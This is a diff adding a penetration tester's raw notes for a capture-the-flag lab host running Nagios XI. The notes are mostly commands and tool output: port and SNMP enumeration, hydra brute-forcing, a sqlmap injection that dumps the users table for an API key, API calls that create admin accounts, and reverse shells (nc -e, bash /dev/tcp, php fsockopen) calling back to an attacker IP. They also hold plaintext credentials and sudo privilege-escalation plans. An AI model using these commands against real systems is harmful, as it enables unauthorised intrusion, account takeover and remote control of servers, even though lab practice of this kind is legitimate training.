@@ -1,0 +1,275 @@
+10.10.11.248
+
+hint: try to register an nagios's account
+svc XjH7VCehowpR1xZB
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+# Nmap 7.94SVN scan initiated Sun Jan 14 17:28:25 2024 as: nmap -sCV -Pn -p- --open -o mornitored-nmap 10.10.11.248
+Nmap scan report for 10.10.11.248
+Host is up (0.067s latency).
+Not shown: 64720 closed tcp ports (conn-refused), 810 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
+|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
+|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
+80/tcp   open  http       Apache httpd 2.4.56
+|_http-title: Did not follow redirect to https://nagios.monitored.htb/
+|_http-server-header: Apache/2.4.56 (Debian)
+389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
+443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
+|_http-server-header: Apache/2.4.56 (Debian)
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
+| Not valid before: 2023-11-11T21:46:55
+|_Not valid after:  2297-08-25T21:46:55
+|_http-title: Nagios XI
+5667/tcp open  tcpwrapped
+Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jan 14 17:29:19 2024 -- 1 IP address (1 host up) scanned in 54.17 seconds
+
+
+PORT      STATE         SERVICE
+68/udp    open|filtered dhcpc
+123/udp   open          ntp
+161/udp   open          snmp
+162/udp   open|filtered snmptrap
+774/udp   open|filtered acmaint_dbd
+17638/udp open|filtered unknown
+18234/udp open|filtered unknown
+22109/udp open|filtered unknown
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+- 389 OpenLDAP 2.2.X - 2.3.
+	ldapsearch -x -H ldap://10.10.11.248 -D '' -w '' -b "dc=monitored,dc=htb"
+	ldapsearch -x -H ldap://10.10.11.248 -b "dc=monitored,dc=htb"
+	ldapsearch -x -H ldap://10.10.11.248 -D '' -w '' -b "cn=users,dc=monitored,dc=htb"
+	ldapsearch -x -H ldap://10.10.11.248 -D 'admin' -w 'admin' -b "dc=monitored,dc=htb"
+	ldapsearch -H ldap://10.10.11.248 -x
+	ldapsearch -b 'dc=monitored,dc=htb' -H 10.10.11.248 -p 389 -v -x
+	
+	ldapsearch -x -H ldap://10.10.11.248 -D 'monitored\svc' -w 'XjH7VCehowpR1xZB' -b "DC=monitored,DC=htb
+	
+	
+- 80,443
+	
+	commonName=nagios.monitored.htb/organizationName=Monitored
+	- dir bruce:
+		[16:18:55] Starting: nagiosxi/                                                                                         
+		[16:18:57] 301 -  338B  - /nagiosxi/help  ->  https://nagios.monitored.htb/nagiosxi/help/
+		[16:18:58] 301 -  339B  - /nagiosxi/about  ->  https://nagios.monitored.htb/nagiosxi/about/
+		[16:18:58] 301 -  340B  - /nagiosxi/images  ->  https://nagios.monitored.htb/nagiosxi/images/
+		[16:18:58] 301 -  339B  - /nagiosxi/tools  ->  https://nagios.monitored.htb/nagiosxi/tools/
+		[16:18:58] 301 -  340B  - /nagiosxi/mobile  ->  https://nagios.monitored.htb/nagiosxi/mobile/
+		[16:18:58] 301 -  339B  - /nagiosxi/admin  ->  https://nagios.monitored.htb/nagiosxi/admin/ ==>x
+		[16:18:58] 301 -  341B  - /nagiosxi/reports  ->  https://nagios.monitored.htb/nagiosxi/reports/ ==> x
+		[16:18:59] 301 -  341B  - /nagiosxi/account  ->  https://nagios.monitored.htb/nagiosxi/account/
+		[16:19:00] 301 -  342B  - /nagiosxi/includes  ->  https://nagios.monitored.htb/nagiosxi/includes/
+		[16:19:00] 301 -  341B  - /nagiosxi/backend  ->  https://nagios.monitored.htb/nagiosxi/backend/
+		[16:19:01] 301 -  336B  - /nagiosxi/db  ->  https://nagios.monitored.htb/nagiosxi/db/ =>x
+		[16:19:02] 301 -  337B  - /nagiosxi/api  ->  https://nagios.monitored.htb/nagiosxi/api/
+		[16:19:06] 301 -  340B  - /nagiosxi/config  ->  https://nagios.monitored.htb/nagiosxi/config/ ==>  X
+		[16:19:16] 301 -  339B  - /nagiosxi/views  ->  https://nagios.monitored.htb/nagiosxi/views/
+		[16:19:23] 403 -  286B  - /nagiosxi/sounds                                  
+		[16:19:40] 200 -    2KB - /nagiosxi/terminal
+	
+	
+	
+	Nagios XI 5.11.0 
+	- pass bruce:
+		https://nagios.monitored.htb/nagios ==> basic authen admin	admin
+		hydra -l nagiosadmin -P /usr/share/wordlists/rockyou.txt -S nagios.monitored.htb http-get "/nagios"
+		
+		
+		https://nagios.monitored.htb/nagiosxi/login.php ==> login 
+		hydra -l nagiosadmin -P /usr/share/wordlists/rockyou.txt nagios.monitored.htb -S https-post-form "/nagiosxi/login.php:username=^USER^&password=^PASS^&nsp=f682c3f46a79fd7f6f493837e64c234c82b6606827d2810c6b32b1775427c7f9&page=auth&debug=&pageopt=login&loginButton=:H=Cookie: nagiosxi=fd7jioatrj0d7eku84q5k26cer:F=Invalid username or password."
+		
+		https://nagios.monitored.htb/nagiosxi/api/v1/authenticate ==> username=svc&password=XjH7VCehowpR1xZB
+		
+		https://nagios.monitored.htb/nagiosxi/terminal
+	
+	- Sqli
+		sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --cookie="nagiosxi=fccrd75qcu16t5rebv0i4c4v26" --method POST --dump -D nagiosxi -T xi_users --drop-set-cookie --technique=ET --dbms=MySQL -p id --risk=3 --level=5 --threads=10
+	
+		IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+		
+		https://support.nagios.com/forum/viewtopic.php?f=16&t=42923
+		
+		curl -s -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d 'username=admintest1&name=admintest1&email=admintest1@test.test&dateformat=1&number_format=1&auth_level=admin&allow_local=0&ad_username=XXXXXXX&email_info=0&auth_type=ad'
+		
+		curl -s -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=admintest&password=admintest&name=admintest&email=admintest@mail.com&auth_level=admin"
+		google:nagios xI web interface apikey example ==> https://support.nagios.com/forum/viewtopic.php?t=42923
+		
+php -r '$sock=fsockopen("10.10.16.78",443);popen("/bin/bash <&3 >&3 2>&3", "r");'
+/bin/bash -c "nc 10.10.16.78 443 -e /bin/bash"
+		
+		
+- 5667 what service is this ???
+	nagiosxi ???
+
+- 123
+	nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 10.10.11.248
+
+- 161,162 UDP 
+	sudo nmap -sU -Pn -p 161,162 --script "snmp* and not snmp-brute" 10.10.11.248 > snmp-nmap
+		|   557: 
+		|     Name: sh
+		|     Path: /bin/sh
+		|     Params: -c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB
+		
+	hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.11.248 snmp
+		[161][snmp] host: 10.10.11.248   password: public
+	snmpbulkwalk -c public -v2c 10.10.11.248 . > snmpall
+	snmpwalk -v 2c -c public 10.10.11.248
+	snmpwalk -v 2c -c public 10.10.11.248 NET-SNMP-EXTEND-MIB::nsExtendOutputFull .
+	
+	snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 10.10.11.248 'nsExtendStatus."evilcommand"' = createAndGo 'nsExtendCommand."evilcommand"' = /bin/echo 'nsExtendArgs."evilcommand"' = 'hello world'
+	
+	braa public@10.10.11.248:.1.3.6.*
+	
+	- private string : snmptrapd ?
+		snmpwalk -v 2c -c snmptrapd 10.10.11.248 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+		SNMP-VIEW-BASED-ACM-MIB::vacmContextName."snmptrapd" = STRING: snmptrapd
+		SNMP-VIEW-BASED-ACM-MIB::vacmGroupName.1."comm1" = STRING: grpcomm1
+		SNMP-VIEW-BASED-ACM-MIB::vacmGroupName.2."comm1" = STRING: grpcomm1
+		SNMP-VIEW-BASED-ACM-MIB::vacmGroupName.3."authPrivUser" = STRING: grpauthPrivUser
+	
+
+svc XjH7VCehowpR1xZB
+- try login with 
+	https://nagios.monitored.htb/nagios ==> fail if i remember corecly
+	https://nagios.monitored.htb/nagiosxi/login.php ==> The specified user account has been disabled or does not exist. ==>> account diasble
+	https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
+
+ref:https://support.nagios.com/kb/article/nagios-log-server-api-examples-596.html
+
+Config =>  Core Config Manager => Commands => 
+
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.47/443 0>&1"
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: nagios.monitored.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 392' -H $'Origin: https://nagios.monitored.htb' -H $'Referer: https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?cmd=insert&type=command&returnUrl=index.php%3Fcmd%3Dview%26type%3Dcommand%26page%3D1' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: iframe' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Te: trailers' -H $'Connection: close' -b 'nagiosxi=1ouaomv6n78mbtla2c6oe57vno' --data-binary 'tfName=mycmd&tfCommand=%2Fbin%2Fbash+-c+%22%2Fbin%2Fbash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.16.55%2F443+0%3E%261%22&selCommandType=1&chbActive=1&selPlugins=null&cmd=submit&mode=insert&hidId=0&hidName=&hidServiceDescription=&hostAddress=127.0.0.1&exactType=command&type=command&genericType=command&returnUrl=index.php%3Fcmd%3Dview%26type%3Dcommand%26page%3D1&token=462ef0651a3cca15bf64d03c42749f3c' 'https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?type=command&page=1'
+
+https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php?token=1558ef9258b880aa76f27dae4ab3be8a9464b140
+
+nc 10.10.16.78 443 -e /bin/bash
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+nagios@monitored:~$ find / -group 1002 -not -path "/proc/*" -not -path "/run/*>
+/usr/local/nagios/var/rw
+/usr/local/nagios/var/rw/nagios.cmd
+/usr/local/nagios/var/rw/nagios.qh
+
+2024/03/12 04:39:30 CMD: UID=0     PID=14379  | /bin/bash /usr/local/nagiosxi/scripts/manage_services.sh status mysqld 
+2024/03/12 04:39:01 CMD: UID=0     PID=14338  | /bin/sh -e /usr/lib/php/sessionclean 
+
+
+nagios@monitored:~$ sudo -l
+Matching Defaults entries for nagios on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User nagios may run the following commands on localhost:
+    (root) NOPASSWD: /etc/init.d/nagios start
+    (root) NOPASSWD: /etc/init.d/nagios stop
+    (root) NOPASSWD: /etc/init.d/nagios restart
+    (root) NOPASSWD: /etc/init.d/nagios reload
+    (root) NOPASSWD: /etc/init.d/nagios status
+    (root) NOPASSWD: /etc/init.d/nagios checkconfig
+    (root) NOPASSWD: /etc/init.d/npcd start
+    (root) NOPASSWD: /etc/init.d/npcd stop
+    (root) NOPASSWD: /etc/init.d/npcd restart
+    (root) NOPASSWD: /etc/init.d/npcd reload
+    (root) NOPASSWD: /etc/init.d/npcd status
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
+    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
+    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
+
+sudo /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php /usr/local/nagiosxi/scripts/send_to_nls.php | whoami
+
+sudo /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php
+
+
+/etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path                       
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios                                                                                                                    
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios                                                                                                                    
+/etc/systemd/system/multi-user.target.wants/nagios.service is calling this writable executable: /usr/local/nagios/bin/nagios                                                                                                                    
+/etc/systemd/system/multi-user.target.wants/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
+/etc/systemd/system/npcd.service is calling this writable executable: /usr/local/nagios/bin/npcd
+You can't write on systemd PATH
+
+/usr/local/nagios/bin/npcd
+/usr/local/nagios/bin/nagios
+
+
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                        
+strace Not Found                                                                                                        
+You can write SUID file: /usr/local/nagios/libexec/check_icmp                                                           
+You can write SUID file: /usr/local/nagios/libexec/check_dhcp
+
+
+sudo /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php 
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+/usr/local/nagios/bin/npcd #==> over write this
+
+(root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh * #==> abuse this to start service ==> root
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+[16:18:55] Starting: nagiosxi/                                                                                         
+[16:18:57] 301 -  338B  - /nagiosxi/help  ->  https://nagios.monitored.htb/nagiosxi/help/
+[16:18:58] 301 -  339B  - /nagiosxi/about  ->  https://nagios.monitored.htb/nagiosxi/about/
+[16:18:58] 301 -  340B  - /nagiosxi/images  ->  https://nagios.monitored.htb/nagiosxi/images/
+[16:18:58] 301 -  339B  - /nagiosxi/tools  ->  https://nagios.monitored.htb/nagiosxi/tools/
+[16:18:58] 301 -  340B  - /nagiosxi/mobile  ->  https://nagios.monitored.htb/nagiosxi/mobile/
+[16:18:58] 301 -  339B  - /nagiosxi/admin  ->  https://nagios.monitored.htb/nagiosxi/admin/
+[16:18:58] 301 -  341B  - /nagiosxi/reports  ->  https://nagios.monitored.htb/nagiosxi/reports/
+[16:18:59] 301 -  341B  - /nagiosxi/account  ->  https://nagios.monitored.htb/nagiosxi/account/
+[16:19:00] 301 -  342B  - /nagiosxi/includes  ->  https://nagios.monitored.htb/nagiosxi/includes/
+[16:19:00] 301 -  341B  - /nagiosxi/backend  ->  https://nagios.monitored.htb/nagiosxi/backend/
+[16:19:01] 301 -  336B  - /nagiosxi/db  ->  https://nagios.monitored.htb/nagiosxi/db/
+[16:19:02] 301 -  337B  - /nagiosxi/api  ->  https://nagios.monitored.htb/nagiosxi/api/
+[16:19:06] 301 -  340B  - /nagiosxi/config  ->  https://nagios.monitored.htb/nagiosxi/config/ ==> go
+[16:19:16] 301 -  339B  - /nagiosxi/views  ->  https://nagios.monitored.htb/nagiosxi/views/
+[16:19:23] 403 -  286B  - /nagiosxi/sounds                                  
+[16:19:40] 200 -    2KB - /nagiosxi/terminal
+
+
+
+
+
